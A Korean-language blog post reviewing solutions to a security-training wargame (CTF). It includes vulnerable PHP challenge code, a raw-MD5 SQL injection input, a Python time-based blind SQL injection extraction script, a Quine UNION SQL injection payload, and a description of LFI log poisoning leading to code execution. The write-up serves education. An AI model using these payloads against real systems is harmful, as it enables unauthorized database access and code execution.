+++
date = '2026-01-18T16:08:33+09:00'
draft = false
title = '[Review] SK Shieldus Rookies Wargame Write-Up'
summary = "보안 교육 과정 중 진행된 Wargame에서 개인적으로 기억에 남거나 흥미로웠던 문제들을 중심으로 풀이 과정 리뷰"
toc = true
tags = ["Quine SQL Injection", "SQL Injection", "UNION SQL Injection", "md5 Raw Hash", "Basic Auth", "PHP Session", "LFI"]
+++

---

## 들어가며

이 글은 SK Shieldus Rookies 생성형AI 활용 사이버보안 전문가 양성과정 28기 교육과정 중 진행했던 Wargame 에 대한 후기이다.

본 Wargame은 교육 목적의 비공식 CTF였지만, 전체 문제를 해결하며 풀이 과정을 정리할 수 있었다. 풀이 결과를 기준으로 교육생 간 순위가 집계되었으며, 최종적으로 1위를 기록했다.

일부 문제는 동기 교육생과의 논의를 통해 해결했으며, 협업을 통한 문제 접근 역시 의미 있는 학습 요소였다고 생각한다.

이 중 개인적으로 기억에 남거나 흥미로웠던 문제들을 중심으로 풀이 과정과 간단한 리뷰를 정리한다.

![스크린샷 2026-01-13 134435.png](/review/1/image0.png)

---

## SQL MD5

웹 해킹을 공부할 때 가장 먼저 접하게 되는 취약점 중 하나가 SQL Injection이다.  
그만큼 다양한 SQL Injection 기법이 존재하며, 이번 Wargame에서는 SQL Injection 문제만 총 13문항이 출제되었다.  
단순한 유형부터 흥미로운 변형 기법까지 포함되어 있어 인상 깊었던 문제들이 많았다.

### 문제 분석

먼저 살펴볼 문제는 MD5의 Raw Hash 값을 이용한 SQL Injection 기법을 활용한 문제이다.

![image.png](/review/1/image.png)

문제 페이지에 접속하면 Raw MD5 Hash의 위험성에 대한 간단한 설명이 제공된다.  
기본 개념을 알고 있다면 문제 자체는 어렵지 않지만, 취약점이 발생하는 과정이 흥미로워 정리해 보기로 했다.

문제에서 제공하는 PHP 코드는 다음과 같다.

```php
<?php

$id = $_GET['id'] ?? null;
$pw = $_GET['pw'] ?? null;

if(!is_null($id) && !is_null($pw)) {
    $id = addslashes($id);
    $pw = md5($pw,true);

    $query = "SELECT id FROM user WHERE id = '$id' AND pw = '$pw'";
    $result = $conn->query($query);

    if ($result) {
        if ($row = mysqli_fetch_array($result)) {
            if($row['id']){echo "<hr>FLAG is $flag";}
        } else {
            echo "No matching user found.";
        }
    } else {
        echo "Error: " . $conn->error;
}
    $stmt->close();
}
else{
    echo "param missing";
}
?>
```

코드를 분석해 보면, `id` 파라미터에는 `addslashes()` 함수가 적용되어 있어 문자열 리터럴 탈출이 어렵다. 반면 `pw` 파라미터는 `md5()` 함수로 해시된 값이 그대로 SQL 쿼리에 삽입되고 있다.

![image.png](/review/1/image%201.png)

문제 페이지에서 제공하는 원본 기술 블로그 글에서는 Raw MD5 해시가 MySQL에서 특수한 의미를 갖는 문자를 포함할 수 있으며, 이로 인해 SQL 문에서 위험할 수 있다는 점을 설명하고 있다.

일반적으로 MD5 해시는 입력값을 완전히 변형하므로, 어떻게 SQL Injection이 가능한지 의문이 들 수 있다. 이 문제의 핵심은 PHP의 `md5()` 함수가 출력을 16진수 문자열이 아닌 원시 바이너리(Raw) 형식으로 반환할 수 있다는 점이다.

`md5()` 함수의 두 번째 인자가 `true`로 설정되어 있기 때문에, 사람이 읽을 수 있는 16진수 문자열 대신 Raw Bit 값이 반환된다. 이 Raw 데이터에는 `'`, `"` 등 SQL 문에서 특수한 의미를 갖는 문자가 포함될 수 있다.

물론, 원하는 SQL Injection 구문을 포함하는 Raw MD5 해시 값을 직접 계산하는 것은 현실적으로 매우 어렵다.

![image.png](/review/1/image%202.png)

다행히 문제에서 참고하도록 제공된 블로그 포스팅에는 이미 계산된 예제가 존재한다.  
`129581926211651571912466741651878684928` 값을 MD5로 해시하고 Raw 형식으로 출력하면 `?T0D??o#??'or'8.N=?` 라는 문자열이 생성된다고 한다.

### 익스플로잇

`pw` 파라미터에 앞서 언급한
`129581926211651571912466741651878684928` 값을 입력하면, 서버에서는 이를 MD5 Raw 해시 값인
`?T0D??o#??'or'8.N=?` 로 변환한다.

이 값이 포함된 최종 SQL 쿼리는 다음과 같다.

```sql
SELECT id FROM user WHERE id = 'admin' AND pw = '?T0D??o#??'or'8.N=?'
```

SQL에서 문자열은 Boolean 평가 시 `TRUE`로 간주되며, 연산자 우선순위는 `AND`가 `OR`보다 높다.
따라서 위 조건식은 다음과 같이 평가된다.

- id = 'admin' AND pw = '?T0D??o#??' → FALSE  
- FALSE OR '8.N=?' → TRUE

결과적으로 전체 WHERE 조건이 참이 되어 쿼리는 정상적으로 결과를 반환하게 된다.

![image.png](/review/1/image%203.png)

실제로 MySQL 환경에서 동일한 쿼리를 실행하면 모든 결과가 반환되는 것을 확인할 수 있다.

문제 코드에서는 쿼리 결과로 row가 하나라도 반환되면 FLAG를 출력하도록 되어 있으므로,
`pw` 파라미터에 `129581926211651571912466741651878684928` 값을 전달하면 FLAG를 획득할 수 있다.

![image.png](/review/1/image%204.png)

---

## HackMe

다음으로 살펴볼 문제는 HackMe이다.  
이번 Wargame에서 가장 많은 시간이 소요된 문제였으며, 페이로드 구성 또한 복잡해 공격 원리를 이해하는 데 시간이 필요했다.

### 문제 분석
문제에서 제공하는 PHP 코드는 다음과 같다.
```php
<?php 

$id = $_GET['id'] ?? null;
$query="select id,pw from users where id='$id'"; 
$stmt = $conn->prepare($query);
$stmt->execute();
$result = $stmt->get_result();

if(isset($_GET['id']) && isset($_GET['pw'])) 
{ 
    if ($result) {
        $row = $result->fetch_assoc();
        if(!$row['id']) exit(); 

        if($row['id'] == $_GET['id']) 
        { 
            $row['pw']=trim($row['pw']); 
            $_GET['pw']=trim($_GET['pw']); 

            if(!$row['pw']) exit(); 

            if($row['pw']==md5($_GET['pw'])) { 
                echo("<div class='msg'>Flag is $flag</div>"); 
            } 
            else { 
                echo("<div class='error'>Wrong password</div><br>"); 
            } 
        } 
        else 
        { 
            echo("<div class='error'>Invalid ID</div><br>"); 
        } 
    }
} 
?>
```

코드를 분석해 보면 FLAG 획득 조건은 다음과 같이 정리할 수 있다.

- `id` 파라미터에 대한 별도의 검증 없이 SQL 쿼리가 구성된다.
- 쿼리 결과로 반환된 `id` 컬럼의 값이 사용자 입력 `id`와 동일해야 한다.
- 사용자 입력 `pw`의 MD5 해시값과 DB에 저장된 `pw` 값이 일치해야 한다.

위 조건을 모두 만족할 경우 FLAG가 출력된다.

### Time Based Blind SQL Injection

먼저, SQL 쿼리에 직접 삽입되는 `id` 파라미터에 대한 검증이 없으므로 이를 이용해 SQL Injection을 수행할 수 있다.

DB Finger Printing에 사용한 Time-Based Blind SQL Injection 페이로드는 다음과 같다.

```python
import requests
from time import sleep
import urllib3
import time
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def exploit():
    pos = 1
    seq = 1
    baseURL = "https://{HOST}/challenges/hackme/index.php?pw=1&id="
    flag = ""
    for pos in range(1, 100):
        bit = ''
        for seq in range(1, 9):
            # Fingerprinting:
            # (SELECT DATABASE())
            # (SELECT table_name FROM information_schema.tables WHERE table_schema="hackme" LIMIT 1 OFFSET 0)
            # (SELECT COLUMN_NAME from information_schema.COLUMNS WHERE table_name ="users" LIMIT 1 OFFSET 0)
            # (SELECT COLUMN_NAME from information_schema.COLUMNS WHERE table_name ="flag" LIMIT 1 OFFSET 0)
            # (SELECT flag FROM flag LIMIT 1 OFFSET 0)
            value = '(SELECT pw FROM users LIMIT 1 OFFSET 0)'
            payload = f"' OR IF(SUBSTRING(LPAD(CONV(HEX(SUBSTRING({value},{pos},1)),16,2),8,0),{seq},1)=0,SLEEP(0.2),0) AND '1'='1"
            url = baseURL + requests.utils.quote(payload)
            cookies = {
                "PHPSESSID": "tvsefvdkf5kt5i1cdjn2352ecq1"
            }
            start = time.perf_counter()
            response = requests.get(url, verify=False, cookies=cookies)
            end = time.perf_counter()
            elapsed = end - start
            if elapsed > 0.2:
                bit += '0'
            else:
                bit += '1'
        char = chr(int(bit, 2))
        flag += char
        print(f"Current flag: {flag}")

exploit()
```

핵심이 되는 SQL 구문은 다음 부분이다.

```sql
IF(
  SUBSTRING(
    LPAD(CONV(HEX(SUBSTRING({value},{pos},1)),16,2),8,0),
    {seq},
    1
  ) = 0,
  SLEEP(0.2),
  0
)
```

다소 복잡해 보이지만, 각 함수의 역할을 순서대로 살펴보면 이해할 수 있다.

1. `SUBSTRING({value}, {pos}, 1)`  
→ 추출 대상 문자열에서 한 글자를 가져온다.
2. `HEX()`  
→ 문자를 16진수 값으로 변환한다.
3. `CONV(..., 16, 2)`  
→ 16진수를 2진수로 변환한다.
4. `LPAD(..., 8, 0)`  
→ 모든 문자를 8bit 이진수로 정규화한다.
5. `SUBSTRING(..., {seq}, 1)`  
→ 특정 비트를 하나씩 비교한다.
6. 조건이 참일 경우 `SLEEP()`을 호출해 응답 지연 여부로 비트 값을 판단한다.

이 방식을 이용하면 한 번의 비교로 1bit를 추출할 수 있으며,
ASCII 문자 하나를 알아내기 위해서는 총 8번의 비교가 필요하다.

해당 과정을 반복하면 문자열 전체를 순차적으로 추출할 수 있다.

`{value}`에 들어가는 SQL 구문을 변경하며 DB Finger Printing을 수행한 결과는 다음과 같다.

- `DB` : `hackme`  
    ![image.png](/review/1/image%205.png)
    
- `TABLE` : `users`  
    ![image.png](/review/1/image%206.png)
    
- `COLUMNS` : `id` , `pw`  
    ![image.png](/review/1/image%207.png)
    ![image.png](/review/1/image%208.png)
    
- `VALUES` : `id : admin`, `pw :  hackmeifucan`  
    ![image.png](/review/1/image%209.png)
    ![image.png](/review/1/image%2010.png)
    

### 익스플로잇 시나리오 구성

Finger Printing을 통해 확인한 `admin` 계정의 비밀번호는 `hackmeifucan`이다.

그러나 FLAG 출력 조건을 다시 보면 다음과 같다.

```php
if($row['pw']==md5($_GET['pw']))
```

사용자 입력값에만 `md5()` 함수가 적용되며, MD5는 항상 32자리 16진수 문자열을 반환한다.
따라서 정상적인 입력으로는 해당 비교 조건을 만족할 수 없다.

이를 우회하기 위해서는 SQL Injection을 통해 DB에서 반환되는 `pw` 값을 사용자가 입력할 `pw`의 MD5 해시값으로 조작할 필요가 있다.

UNION SQL Injection을 활용하면 다음과 같은 형태의 페이로드를 구성할 수 있다.

```sql
' UNION SELECT 'admin', 'c4ca4238a0b923820dcc509a6f75849b
```

이를 통해 `pw` 값을 원하는 해시값으로 설정할 수 있다.

하지만 마지막으로 해결해야 할 문제가 남아 있다.

```php
if($row['id'] == $_GET['id']) 
```

이 조건을 통과하려면 입력한 `id` 값과 쿼리 결과로 반환된 `id` 값이 완전히 동일해야 한다.
그러나 `id`에는 SQL Injection 페이로드가 포함되므로, 결과적으로 자기 자신을 반환해야 하는 자기참조 구조에 직면하게 된다.

이 지점에서 문제 해결이 지체되었으며, 추가적인 조사 끝에 Quine SQL Injection이라는 기법을 확인할 수 있었다.

Quine SQL Injection은 쿼리의 출력 결과가 다시 입력값과 동일해지도록 구성하는 공격 기법으로, 본 문제의 제약 조건을 만족시키는 데 적합한 방법이었다.

해당 기법에 대한 상세한 설명은 글의 분량상 생략하고, 별도로 정리한 [Quine SQL Injection 분석](https://kmingon.github.io/analysis/analysis-quine-sql-injection-%EB%B6%84%EC%84%9D/) 글을 참고하길 바란다.

### 익스플로잇

Quine SQL Injection을 이용해 구성한 최종 페이로드는 다음과 같다.

```sql
id = 1' union select replace(
        replace(
          '1" union select replace(replace("$",char(34),char(39)),char(36),"$") as id,
          "c4ca4238a0b923820dcc509a6f75849b" as pw#',
          char(34),
          char(39)
        ),
        char(36),
        '1" union select replace(replace("$",char(34),char(39)),char(36),"$") as id,
        "c4ca4238a0b923820dcc509a6f75849b" as pw#'
     ) as id,
     'c4ca4238a0b923820dcc509a6f75849b' as pw#
pw = 1
```

위 페이로드는 Quine SQL Injection을 통해 입력 `id` 값과 반환 `id` 컬럼 값을 일치시키고,
UNION SQL Injection을 이용해 사용자 입력 `1`의 MD5 해시값인
`c4ca4238a0b923820dcc509a6f75849b`를 `pw` 컬럼으로 반환하도록 구성되어 있다.

그 결과, 모든 조건을 만족하며 FLAG를 획득할 수 있다.

![image.png](/review/1/image%2011.png)

---

## 그 외 다양한 문제

앞서 소개한 SQL Injection 문제 외에도 여러 흥미로운 문제가 있었다.  
기본적인 풀이 자체는 비교적 단순했던 문제들이었기 때문에, 이 섹션에서는 풀이 과정 전체보다는 문제에서 사용된 핵심 개념 위주로 정리하고자 한다.

### Race Condition

먼저 살펴볼 문제는 Race Condition을 다루는 문제이다.

```php
<?php
$ip = $_SERVER['REMOTE_ADDR'] ?? "123";

// IP 유효성 검증 (보안 강화)
if (!filter_var($ip, FILTER_VALIDATE_IP)) {
    die("잘못된 IP 주소입니다.");
}

if (isset($_GET['mode']) && $_GET['mode'] === "gogossing") {
    echo "Race Start~<br>";

    $filePath = "readme/$ip.txt";

    // 파일이 존재하면 내용 읽기
    if (file_exists($filePath)) {
        $result = file_get_contents($filePath);

        // IP가 파일 내용에 포함되어 있는지 확인
        if (preg_match("/\b$ip\b/", $result)) {
            echo "Done!<br>";
            unlink($filePath); // 파일 삭제
            echo "FLAG is $flag";
            exit();
        }
    }
}

// IP 기록 파일 생성
$filePath = "readme/$ip.txt";
file_put_contents($filePath, $ip);

// 로컬호스트가 아니면 2초 후 파일 삭제
if ($ip !== "127.0.0.1") {
    sleep(2);
    if (file_exists($filePath)) {
        unlink($filePath);
    }
}
?>
```

코드만 보면, 2초 이내에 동일한 IP 주소로 동시에 요청을 보내기만 하면 FLAG를 획득할 수 있을 것처럼 보인다.  
그러나 실제로 동일한 환경에서 여러 차례 시도해 보아도 FLAG는 출력되지 않았다.

조사 결과, 해당 문제 서버는 PHP Session을 통해 사용자를 관리하고 있었다.  
PHP 관련 문서를 확인해 보면, PHP Session은 기본적으로 세션 락킹(Session Locking) 메커니즘을 사용한다.

이로 인해 동일한 세션 ID를 가진 요청은 직렬 처리되며,
IP 파일을 생성하는 요청과 파일을 읽어 FLAG를 출력하는 요청이 병렬로 처리되지 않는다.  
결과적으로 Race Condition이 발생하지 않아 FLAG를 획득할 수 없었던 것이다.

따라서 이 문제를 해결하기 위해서는 동일한 IP 주소를 유지하되, 서로 다른 세션을 사용하는 환경에서 요청을 보내야 한다.  
예를 들어, Secret Browser와 같이 세션을 분리할 수 있는 환경을 활용하면 FLAG를 획득할 수 있다.

이 문제를 통해 PHP Session이 세션 락킹이라는 특성을 가진다는 점을 실질적으로 이해할 수 있었으며, Race Condition 취약점이 환경에 따라 무력화될 수 있다는 점에서 인상 깊었다.

### LFI II

다음으로 살펴볼 문제는 LFI II 문제이다.
문제에서 제공된 코드는 다음과 같다.

```php
<?php

$user=md5("$_SESSION[id]");
$tm=date('m-d H:i',time());

$f=@fopen("logs/$user","a");
@fwrite($f,"[$tm] $_SERVER[HTTP_USER_AGENT]\n");
@fclose($f);

    if($_GET[file])
    {
        if(substr($_GET[file],0,1)=="/") exit("Access Denied");
        if(eregi("\.\.|:",$_GET[file])) exit("Access Denied");
        if(strlen($_GET[file])>50) exit("Access Denied");
        @include "$_GET[file]";
    }

    else
    {
        echo("<a href=?file=test>test</a><br>");
        echo("<a href=?file=hi>hi</a><br>");
    }

?> 
```

해당 코드에서는 사용자 세션 ID를 MD5로 해시한 값을 로그 파일명으로 사용하고 있으며,
요청 시 전달되는 `User-Agent` 값을 그대로 로그 파일에 기록하고 있다.  

이 구조를 이용하면, `User-Agent` 헤더에 임의의 PHP 코드를 삽입한 요청을 전송한 뒤
해당 로그 파일을 `include`하도록 유도함으로써 로그 파일을 통한 PHP 코드 실행이 가능해진다.

즉, 부적절한 로그 관리가 LFI(Local File Inclusion) 취약점과 결합되어 RCE로 이어질 수 있는 사례라고 볼 수 있다.  
단순한 LFI 문제처럼 보이지만, 실제 운영 환경에서도 충분히 발생할 수 있는 패턴이라는 점에서 인상 깊은 문제였다.

---

## 마지며

이번 글에서 다룬 문제 외에도,
HTTP Method 이름을 임의로 변경해 Basic Auth를 우회하는 문제,
.htaccess 파일의 옵션을 조작해 PHP 엔진을 비활성화하고 원본 PHP 소스 코드를 확인하는 문제 등
다양한 유형의 흥미로운 문제들이 함께 출제되었다.

이번 Wargame을 통해 단순한 취약점 재현을 넘어,
환경·구현 방식·설계상의 선택이 보안에 어떤 영향을 미치는지를 다시 한 번 고민해 볼 수 있었다.

이 글이 유사한 문제를 접하는 사람들에게 또 다른 관점에서 취약점을 바라볼 수 있는 참고 자료가 되기를 바란다.

---

>참고자료  
> [https://cvk.posthaven.com/sql-injection-with-raw-md5-hashes](https://cvk.posthaven.com/sql-injection-with-raw-md5-hashes)  
> [https://github.com/phpredis/phpredis/issues/37](https://github.com/phpredis/phpredis/issues/37)  
> [https://www.php.net/manual/en/features.session.security.management.php](https://www.php.net/manual/en/features.session.security.management.php)  